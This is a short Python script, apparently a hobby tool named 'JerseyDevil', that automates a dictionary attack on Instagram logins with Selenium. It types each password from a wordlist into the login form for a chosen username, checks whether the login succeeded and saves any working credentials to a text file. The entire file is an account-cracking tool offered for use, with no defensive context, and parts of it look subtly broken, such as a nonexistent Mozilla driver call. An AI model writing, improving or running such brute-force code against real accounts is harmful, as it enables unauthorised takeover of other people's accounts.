from selenium import webdriver
from selenium.webdriver.common.by import By
import time
class JerseyDevil:
    def __init__(self, driverPATH, browser):
        self.driverPATH = str(driverPATH)
        self.browser = str(browser).lower()
        self.url = "https://www.instagram.com/accounts/login/"
        if self.browser == "mozilla":
            self.driverObj = webdriver.Mozilla(self.driverPATH)
        elif self.browser == "chrome":
            self.driverObj = webdriver.Chrome(self.driverPATH)
        self.list = []

    def openPage(self):
        self.driverObj.get(self.url)

    def tryAttack(self, username, password):
        emailElement = self.driverObj.find_element(By.XPATH,".//*[@name='username']")
        emailElement.send_keys(username)
        passElement = self.driverObj.find_element(By.XPATH,".//*[@name='password']")
        passElement.send_keys(password)
        submit = self.driverObj.find_element(By.XPATH,".//*[@type='submit']")
        submit.click()
        time.sleep(5)
        if self.verifyLogIn() != True:
            self.driverObj.refresh()
        else:
            self.savePassword(username, password)

    def dictionaryAttack(self, dictPATH, username):
        lista = []
        file = open(dictPATH, "r")
        for line in file.readlines():
            lista.append(line.replace("\n", ""))
        file.close()
        for el in lista:
            self.tryAttack(username, str(el))

    def verifyLogIn(self):
        page = self.driverObj.page_source
        if "not-logged-in" in page:
            return False
        else:
            return True

    def savePassword(self, username, password):
        outFile = open("password.txt", "w")
        outFile.write(str("Username: " + username + " Password: " + password))
        outFile.close()





